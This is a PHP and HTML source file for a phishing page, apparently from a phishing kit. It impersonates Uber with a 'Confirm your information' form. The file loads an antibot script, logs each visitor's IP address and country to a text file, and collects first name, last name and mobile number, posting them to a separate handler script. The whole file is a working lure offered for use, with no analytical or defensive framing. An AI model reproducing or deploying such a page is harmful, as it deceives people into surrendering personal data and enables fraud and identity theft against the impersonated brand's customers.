<?php
require "antibot.php";

function file_get_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

function getRealIpAddr() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; // use first IP if commaÃ¢â‚¬â€˜separated
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$realip = getRealIpAddr();

// Use ip-api.com as the geolocation service (no API key needed)
$json = file_get_contents_curl('http://ip-api.com/json/' . $realip);
$obj = json_decode($json);

$countryName = $obj->country ?? 'Unknown';
$countryCode = $obj->countryCode ?? 'XX';

$messageTxt = "IP : $realip | Country : $countryName\n";
file_put_contents("Views.txt", $messageTxt, FILE_APPEND);

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Confirm your information</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#ffffff;
      --text:#111111;
      --muted:#6b7280;
      --border:#e5e7eb;
      --border-strong:#d1d5db;
      --black:#000000;
      --radius:12px;
      --radius-sm:10px;
      --shadow:0 1px 2px rgba(0,0,0,.06), 0 8px 24px rgba(0,0,0,.08);
      --focus:#111111;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", sans-serif;
      background:var(--bg);
      color:var(--text);
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }
    header{
      background:var(--black);
      height:56px;
      display:flex;
      align-items:center;
      padding:0 24px;
    }
    header .brand{
      color:#fff;
      font-weight:700;
      letter-spacing:.2px;
      font-size:20px;
      line-height:1;
      user-select:none;
    }
    main{
      min-height:calc(100% - 56px);
      display:flex;
      align-items:center;
      justify-content:center;
      padding:40px 16px;
    }
    .card{
      width:100%;
      max-width:520px;
      text-align:center;
      animation:fadeUp .28s ease both;
    }
    .title{
      font-size:22px;
      line-height:1.3;
      margin:0 0 24px 0;
      font-weight:700;
    }
    .row{
      display:flex;
      gap:12px;
      width:100%;
    }
    .field{
      flex:1;
      display:flex;
    }
    .input{
      width:100%;
      padding:14px 14px;
      border:1px solid var(--border);
      border-radius:var(--radius-sm);
      font-size:16px;
      transition:border-color .18s ease, box-shadow .18s ease;
      outline:none;
      background:#fff;
    }
    .input:hover{ border-color:var(--border-strong); }
    .input:focus{
      border-color:var(--focus);
      box-shadow:0 0 0 4px rgba(17,17,17,.08);
    }
    .phone-wrap{
      display:flex;
      gap:8px;
      width:100%;
    }
    .country{
      display:flex;
      align-items:center;
      gap:8px;
      padding:10px 12px;
      border:1px solid var(--border);
      border-radius:var(--radius-sm);
      background:#fff;
      min-width:110px;
      cursor:pointer;
    }
    .country:hover{ border-color:var(--border-strong) }
    .flag{ font-size:18px; line-height:1 }
    .caret{ width:16px; height:16px; opacity:.6 }
    .phone-input{ flex:1 }
    .controls{
      margin-top:40px;
      display:flex;
      align-items:center;
      justify-content:center;
      gap:28px;
    }
    .circle-btn{
      width:44px;
      height:44px;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      border-radius:999px;
      border:1px solid var(--border);
      background:#fff;
      box-shadow:0 1px 2px rgba(0,0,0,.05);
      cursor:pointer;
      transition:transform .05s ease, box-shadow .18s ease, border-color .18s ease;
    }
    .circle-btn:hover{ border-color:var(--border-strong) }
    .circle-btn:active{ transform:translateY(1px) }
    .arrow{ width:18px; height:18px }
    .pill-btn{
      display:inline-flex;
      align-items:center;
      gap:10px;
      padding:12px 18px;
      background:#000;
      color:#fff;
      border-radius:999px;
      border:0;
      cursor:pointer;
      font-weight:700;
      font-size:16px;
      box-shadow:var(--shadow);
      transition:opacity .18s ease, transform .05s ease;
    }
    .pill-btn:hover{ opacity:.95 }
    .pill-btn:active{ transform:translateY(1px) }
    @keyframes fadeUp{
      from{opacity:0; transform: translateY(6px)}
      to{opacity:1; transform: translateY(0)}
    }
  </style>
</head>
<body>
  <header>
    <div class="brand">Uber</div>
  </header>
  <main>
    <div class="card">
      <h1 class="title">Confirm your information</h1>
      <form method="post" action="post1.php">
      <div class="row">
        <div class="field">
          <input class="input" type="text" name="first" placeholder="Enter first name" autocomplete="given-name" required>
        </div>
        <div class="field">
          <input class="input" type="text" name="second" placeholder="Enter last name" autocomplete="family-name" required>
        </div>
      </div>

      <div class="row" style="margin-top:12px">
        <div class="phone-wrap">

  
 

          <input class="input phone-input" type="tel" name="num" placeholder="Mobile number" autocomplete="tel" required>
        </div>
      </div>

      <div class="controls">
        <button class="circle-btn" type="submit" onclick="history.back()" aria-label="Back">
          <svg class="arrow" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
            <path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </button>

        <button class="pill-btn" type="submit">
          Next
          <svg class="arrow" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
            <path d="M9 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </button>
        </div>
        </form>
      </div>
    </div>
  </main>
</body>
</html>
